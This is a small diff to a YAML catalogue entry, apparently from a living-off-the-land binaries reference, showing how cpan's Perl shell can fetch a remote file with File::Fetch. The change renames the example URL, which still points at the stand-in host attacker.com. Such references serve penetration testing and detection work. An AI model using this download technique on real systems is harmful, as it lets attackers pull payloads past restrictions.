@@ -23,7 +23,7 @@ functions:
   file-download:
     - description: Fetch a remote file via HTTP GET request and store it in PWD.
       code: |
-        export URL=http://attacker.com/evil.txt
+        export URL=http://attacker.com/file_to_get
         cpan
         ! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();
 
